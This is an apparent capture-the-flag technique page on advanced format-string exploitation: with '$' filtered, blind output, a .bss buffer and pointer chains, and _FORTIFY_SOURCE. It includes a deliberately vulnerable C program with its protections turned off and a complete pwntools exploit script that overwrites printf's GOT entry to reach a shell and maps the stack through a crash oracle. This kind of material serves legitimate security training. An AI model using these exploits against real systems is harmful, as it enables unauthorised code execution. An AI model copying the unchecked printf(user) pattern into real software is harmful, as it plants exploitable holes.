---
title: "Format String - No $, Blind, Looped and Fortified"
category: pwn
subcategory: format-string
type: technique
tags: [format-string, fmtstr, fsb, printf, snprintf, syslog, percent-n, arbitrary-write, arbitrary-read, blind-exploitation, info-leak, fortify-source, got, plt, pie, aslr, one-gadget, pwntools, gef, pwndbg]
difficulty: hard
summary: "Format strings when $ is filtered, when you cannot see the output, when printf runs in a loop, and when _FORTIFY_SOURCE blocks %n."
when_to_use:
  - "The program rejects or strips `$`, so `%7$p` is unavailable"
  - "Output is not echoed back - you only observe crash/no-crash or timing"
  - "printf(user) runs inside a loop or a menu, giving many cheap rounds"
  - "glibc aborts with `%n in writable segment detected`"
  - "The sink is syslog(), snprintf() or sprintf() rather than printf()"
tools: [pwntools, gdb, gef, pwndbg, checksec, one-gadget, ltrace, strace]
related: [fmtstr-read-leak, fmtstr-arbitrary-write, rop-got-overwrite, mitigation-partial-overwrite-brute, mitigation-modern-playbook, rop-one-gadget, pwntools-cheatsheet]
---

## TL;DR

Direct parameter access (`%7$p`) is a convenience, not a requirement: `%p` repeated
N times reaches slot N, so a `$` filter only costs payload length. With no output
you turn the bug into a crash oracle; with `%n` fortified away you still keep a
full arbitrary read; and when your buffer is not on the stack you write through a
pointer that is *already* there.

## Recognise it

- Input filter: `if (strchr(buf, '$')) exit(1);` or `%` counted/limited.
- The format string is copied into a global/`.bss` buffer before being printed,
  so you cannot place your own pointer in the vararg area.
- `printf` output goes to a log file / a socket you do not read / `/dev/null`.
- The binary aborts with `*** %n in writable segment detected ***`.
- The sink is `syslog(LOG_INFO, buf)` or `sprintf(out, buf)` - same bug, a
  different observation channel.

## Vulnerable source

```c
/* fmtadv.c - three variants in one binary, selected by argv[1].
 *   nodollar : strips '$' from the input
 *   bss      : copies the input into .bss before printing (no self-pointer)
 *   blind    : prints into a buffer you never see
 */
#include <stdio.h>
#include <string.h>

char global[512], sink[1024];

static void strip(char *s, char c) {          /* removes every '$' in place */
    char *w = s;
    for (char *r = s; *r; r++) if (*r != c) *w++ = *r;
    *w = 0;
}

int main(int argc, char **argv) {
    char buf[256];
    const char *mode = argc > 1 ? argv[1] : "nodollar";
    setvbuf(stdout, NULL, _IONBF, 0);
    for (int i = 0; i < 64; i++) {
        printf("> ");
        if (!fgets(buf, sizeof buf, stdin)) break;
        buf[strcspn(buf, "\n")] = 0;
        if (!strcmp(mode, "nodollar")) {
            strip(buf, '$');
            printf(buf);                       /* bug, no direct access */
        } else if (!strcmp(mode, "bss")) {
            strcpy(global, buf);
            printf(global);                    /* bug, buffer not on the stack */
        } else {
            snprintf(sink, sizeof sink, buf);  /* bug, output never shown */
        }
        putchar('\n');
    }
    return 0;
}
```

```bash
# WITHOUT fortify so %n still works; 32-bit keeps the payloads short
gcc -m32 -fno-stack-protector -no-pie -z norelro -Wno-format-security \
    -U_FORTIFY_SOURCE -O0 -o fmtadv32 fmtadv.c
gcc      -fno-stack-protector -no-pie -z norelro -Wno-format-security \
    -U_FORTIFY_SOURCE -O0 -o fmtadv64 fmtadv.c

# WITH fortify, to reproduce the abort:  *** %n in writable segment detected ***
gcc -m32 -O2 -D_FORTIFY_SOURCE=2 -Wno-format-security -o fmtadv_fort fmtadv.c
./fmtadv_fort nodollar <<< '%n'
```

## Theory

### 1. Walking the stack without `$`

`%p` consumes the next vararg every time, so reaching slot N means emitting N
conversions. Make the first N-1 cheap: `%c` emits exactly one character and costs
two payload bytes, which is the cheapest skip when you also need to control the
`%n` counter.

```text
[ addr ][ addr+2 ]             <- 8 bytes of pointers at the front (i386)
%c%c%c ... %c                  <- (slot-1) skips, each adding 1 to the counter
%<pad>c%hn                     <- pad the counter to the low half, then write
%<pad2>c%hn                    <- second half
```

The arithmetic is identical to the `$` case, but you cannot reorder the writes:
they happen in the order the conversions appear, and each advances the vararg
pointer by one slot. So the *pointers must be laid out in the same order you
write them*. pwntools emits exactly this with
`fmtstr_payload(offset, {addr: value}, no_dollars=True)`.

### 2. Writing without controlling a pointer (the pointer-chain trick)

If the format string is in `.bss` you cannot inject a pointer into the vararg
area. But the stack almost always contains **pointers to the stack** already -
saved `ebp`/`rbp` chains, `argv`, `envp`, and any local `char *` - and two nested
pointers are enough for a write.

Procedure on i386, where `ebp` chains are dense:

1. Find slot `A` holding a stack address `X` (a saved `ebp`).
2. `%<n>c%A$hhn` writes one byte to `*X`, so you can move the *low byte* of
   whatever `X` points at - if `X` points at another saved `ebp`, you can aim
   that second pointer anywhere in a 256-byte window.
3. Repeat, byte by byte, until the second pointer is on your real target.
4. Use the now-aimed pointer for the real `%hhn` write.

Slow (4 rounds to aim, 4 more to write 4 bytes) but it needs no control over the
vararg area at all - only a loop.

### 3. Blind format strings

With no output you still get two observable bits. **Crash / no crash**: `%s` on a
garbage slot segfaults, on a valid pointer it does not, so scanning `%1$s ..
%40$s` maps the pointer slots. **Timing / output length**: `%99999999c` takes
measurable time and trips size thresholds.

If the output goes into a fixed buffer that is later used (a log line, an error
message shown elsewhere, a response length), the *length* of the output is an
oracle: `%<N>c` makes the response exactly N bytes longer, and `%<slot>$s` makes
it `strlen(*slot)` bytes longer - which leaks the string length, then, with
`%.<k>s` precision, one byte at a time via a length comparison.

Practical recipe: probe `%s` x k for k = 1..40 and record which k crash (that
maps the pointer slots); for a non-crashing slot, measure the response size to
confirm a readable string; then use `%.1s` .. `%.ks` precision and watch the
response length stop growing at the NUL to recover `strlen`, one byte at a time.

### 4. `_FORTIFY_SOURCE=2`

glibc's `__printf_chk` refuses `%n` when the format string is not in a read-only
mapping, and refuses `%N$` positional arguments mixed with non-positional ones.
Every read conversion (`%p`, `%x`, `%s`) still works, so the arbitrary read
primitive is untouched.

So under FORTIFY you pivot: leak everything with the read primitive, then use a
*different* bug for the write. If the format string is your only bug, look for
an adjacent overflow, or for the classic `printf("%s", buf)` into a small sink
(fortify checks the format, not the destination).

### 5. Other sinks

| Sink | Difference |
|------|-----------|
| `syslog(pri, buf)` | output goes to the log; read it via a log-viewing feature, or go blind |
| `sprintf(out, buf)` | no length cap - a long `%c` run overflows `out`, a second bug |
| `snprintf(out, n, buf)` | output truncated at n, but the `%n` counter still counts what *would* have been written |
| `asprintf` | allocates; a huge `%c` run is a heap-exhaustion DoS |

## Attack

1. Determine the constraint: no `$`, no output, not-on-stack, or fortified.
2. Rebuild the offset scan for it (repeat-`%p` instead of `%N$p`, crash oracle
   instead of echo).
3. Pick the write mechanism: a direct pointer in the payload, or a pointer chain.
4. Budget your rounds - a pointer-chain write needs 8+ printf calls.

## Exploit

```python
#!/usr/bin/env python3
"""fmtstr-advanced: three exploits in one file (add REMOTE HOST=h PORT=p).

    python3 exploit.py           - no '$' allowed, write via repeated %c
    python3 exploit.py CHAIN     - format string in .bss, write via a stack
                                   pointer chain
    python3 exploit.py BLIND     - no output, map the stack with a crash oracle
"""
from pwn import *

EXE  = './fmtadv32'
HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context.binary = exe = ELF(EXE, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

BUF_OFF = 4          # slot index of our buffer on i386 - measure it


def start(mode='nodollar'):
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([EXE, mode], gdbscript='b *printf\nc\n')
    return process([EXE, mode])


def rnd(io, payload):
    io.sendlineafter(b'> ', payload)
    return io.recvline(keepends=False)


# --------------------------------------------------------------- no '$' -----
def find_offset_nodollar(io):
    """Walk the stack with repeated %p until we see our own marker."""
    for n in range(1, 30):
        if b'0x41414141' in rnd(io, b'AAAA' + b'%p' * n):
            log.success('buffer at slot %d (no-dollar)', n)
            return n
    log.error('buffer not found in the first 30 slots')


def payload_nodollar(offset, addr, value):
    """%hn x2 write using only sequential conversions:
    [ addr ][ addr+2 ][ %Nc%hn ][ %Mc%hn ]. The two pointers sit in slots
    `offset` and `offset+1`, so burn (offset - 1) conversions to reach them."""
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff
    if lo > hi:
        first, second, a1, a2 = lo, hi, addr, addr + 2
    else:
        first, second, a1, a2 = hi, lo, addr + 2, addr
    head = p32(a1) + p32(a2)
    body = b'%c' * (offset - 1)          # skip to just before our pointers
    written = len(head) + (offset - 1)   # each %c emits exactly 1 char
    pad1 = (first - written) % 0x10000
    body += b'%' + str(pad1).encode() + b'c%hn'
    written += pad1
    pad2 = (second - written) % 0x10000
    body += b'%' + str(pad2).encode() + b'c%hn'
    return head + body


def run_nodollar():
    io = start('nodollar')
    off = find_offset_nodollar(io)
    if off is None:
        return
    target = exe.got['printf']
    value = exe.symbols.get('win') or exe.symbols['main']
    payload = payload_nodollar(off, target, value)
    assert b'$' not in payload, 'payload must not contain $'
    log.info('payload (%d bytes): %r', len(payload), payload[:80])
    rnd(io, payload)
    # printf@got now points at `value`; the next round calls it.
    io.sendlineafter(b'> ', b'/bin/sh\x00')
    io.interactive()


# --------------------------------------------------- .bss pointer chain -----
def aim_byte(io, slot, byte):
    """One %hhn write of `byte` through the pointer in `slot`, no '$' used.
    Each of the (slot-1) skip conversions emits exactly one character."""
    skip = slot - 1
    pad = (byte - skip) % 256 or 256
    rnd(io, b'%c' * skip + b'%' + str(pad).encode() + b'c%hhn')


def run_chain():
    """The format string lives in .bss, so no self-injected pointer. Use a
    saved-ebp chain: slot A holds a stack address, and *A is another saved ebp.
    Aim A one byte at a time with %hhn, then write the value through it."""
    io = start('bss')

    # 1. Map the stack: which slots hold stack addresses?
    stack_slots = {}
    for i in range(1, 25):
        parts = rnd(io, b'%p' * i).split(b'0x')
        if len(parts) <= i:
            continue
        try:
            v = int(parts[i], 16)
        except ValueError:
            continue
        if 0xf0000000 < v < 0xffffe000:          # i386 stack range
            stack_slots[i] = v
            log.info('slot %2d -> stack %#x', i, v)

    if len(stack_slots) < 2:
        log.error('no usable stack pointers - probe deeper or another frame')
        return

    # 2. A saved ebp is ideal: *ebp is the next saved ebp, so writing through
    #    it moves a SECOND pointer that we then use for the real write.
    slot_a, addr_a = sorted(stack_slots.items())[0]
    log.success('aiming slot %d (holds %#x)', slot_a, addr_a)

    # 3. Walk that second pointer onto the target, then write the value
    #    through it - four rounds each, one byte per round.
    target = exe.got['printf']
    value = exe.symbols.get('win') or exe.symbols['main']
    for word in (target, value):
        for i in range(4):
            aim_byte(io, slot_a, (word >> (8 * i)) & 0xff)

    io.sendlineafter(b'> ', b'/bin/sh\x00')
    io.interactive()


# ----------------------------------------------------------------- blind ----
def probe(payload, timeout=1.0):
    """One payload against a fresh process. -> 'crash' | 'ok' | 'timeout'."""
    try:
        with context.local(log_level='error'):
            io = remote(HOST, PORT) if args.REMOTE else start('blind')
            io.sendlineafter(b'> ', payload)
            io.sendlineafter(b'> ', b'ping')      # did it survive the %s?
            io.recvrepeat(timeout)
            rc = io.poll(block=False)
            io.close()
    except EOFError:
        return 'crash'
    except Exception:
        return 'timeout'
    return 'crash' if (rc is not None and rc < 0) else 'ok'


def run_blind():
    """Map which stack slots hold dereferenceable pointers, using SIGSEGV as
    the only oracle. Step one of every blind format string."""
    good = []
    pr = log.progress('crash-oracle scan')
    for i in range(1, 31):
        pr.status('slot %d', i)
        payload = (b'%' + str(i).encode() + b'$s') if args.DOLLAR else b'%s' * i
        if probe(payload) == 'ok':
            good.append(i)
    pr.success('dereferenceable slots: %s' % good)


if __name__ == '__main__':
    if args.CHAIN:
        run_chain()
    elif args.BLIND:
        run_blind()
    else:
        run_nodollar()
```

## pwntools without `$`

```python
payload = fmtstr_payload(offset, {exe.got['exit']: exe.sym['win']},
                         no_dollars=True)
fmt = FmtStr(execute_fmt=send_fmt, no_dollars=True)   # FmtStr honours it too
fmt.write(exe.got['exit'], exe.sym['win'])
fmt.execute_writes()
```

The dollar-free payload is longer (every skipped slot costs at least `%c`), so
check it still fits the input buffer.

## Variants & pitfalls

- **`%c` emits exactly one character**, so `offset-1` skip conversions add
  `offset-1` to the counter - the classic off-by-N in dollar-free payloads.
- **Conversion order is fixed without `$`**, so you must order the *pointers* to
  match the order of the writes rather than sorting writes by value.
- **Slot alignment.** On x86-64 the first five conversions come from registers, so
  a dollar-free payload burns five `%c` before it touches the stack at all.
- **`%n` counts what glibc *would* have written** under `snprintf`, so `snprintf`
  writes still land - but nothing is echoed, so you are blind.
- **Crash oracles are expensive** - 30 slots x 3 probes is 90 connections; batch
  what you can into a single format string. **Timing oracles need a big margin**:
  `%99999999c` is ~100 MB, and if nobody drains the pipe the process blocks
  instead of finishing, which is a usable signal but is not a crash.
- **Pointer chains move.** Saved `ebp` values differ per run under ASLR; the
  *relationship* between slots is stable, the absolute value is not. Aim by
  writing low bytes only (see mitigation-partial-overwrite-brute).
- **Fortify detects mixed positional args**: `"%p %2$p"` aborts under
  `__printf_chk` even with no `%n`. Use all-positional or none.
- **`strip()`-style filters change the length**, so your padding is off by the
  number of characters removed - measure the post-filter length. And count the
  loop iterations before committing to a plan that needs twelve of them.

## Tools

```bash
# Is it fortified? (both answer the same question)
checksec --file=./fmtadv_fort            # "FORTIFY: Enabled"
objdump -R ./fmtadv_fort | grep printf_chk

# Watch what printf is called with, and what actually escapes to the outside
ltrace -e printf ./fmtadv32 nodollar && strace -e trace=write ./fmtadv32 blind

# Confirm which slot is which, once, locally: b *printf ; c ; telescope $esp 30
gdb -q ./fmtadv32
```
